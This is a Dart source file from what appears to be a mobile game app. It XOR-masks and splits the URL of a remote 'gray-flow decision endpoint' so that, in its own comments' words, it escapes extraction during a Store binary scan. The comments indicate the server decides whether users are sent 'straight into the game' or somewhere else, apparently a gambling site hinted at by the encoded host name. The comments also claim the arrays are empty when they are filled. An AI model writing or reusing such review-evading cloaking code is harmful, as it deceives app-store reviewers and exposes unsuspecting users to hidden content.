import '../cipher/oracle_cipher.dart';

// ============================================================
// BRIDGE URI — masked address of the gray-flow decision endpoint
// ============================================================
// Two byte arrays — protocol+host and path — are XOR-masked with
// the project mantra (see oracle_cipher.dart) and concatenated on
// read. Splitting the URL into pieces foils naive `strings | grep`
// extraction during a Store binary scan.
//
// Fill the arrays with the output of `tool/encode_keys.dart` once
// the production endpoint is known. Until then, the resolver
// returns an empty string and the messenger short-circuits with
// a failure response, sending every user straight into the game.
// ============================================================

class BridgeUri {
  BridgeUri._();

  // encoded "https://ollympusgates.com"
  static const List<int> _schemeHost = <int>[
    0x75, 0xB9, 0x81, 0x4C, 0x6A, 0xCB, 0x4F, 0x3B, 0x0E, 0xD6, 0x24, 0x50,
    0x63, 0x6D, 0xD4, 0xEF, 0x78, 0xB9, 0x89, 0x13, 0xF3, 0x18, 0x85, 0x07,
    0x70,
  ];

  // encoded "/config.php"
  static const List<int> _path = <int>[
    0x32, 0xAE, 0x9A, 0x52, 0x7F, 0x98, 0x07, 0x3A, 0x11, 0xD2, 0x38,
  ];

  /// Reconstructs the full POST endpoint URL.
  /// Returns the empty string when no endpoint is configured;
  /// callers must treat that as an offline-only build.
  static String resolve() {
    if (_schemeHost.isEmpty) return '';
    return OracleCipher.reveal(_schemeHost) + OracleCipher.reveal(_path);
  }
}
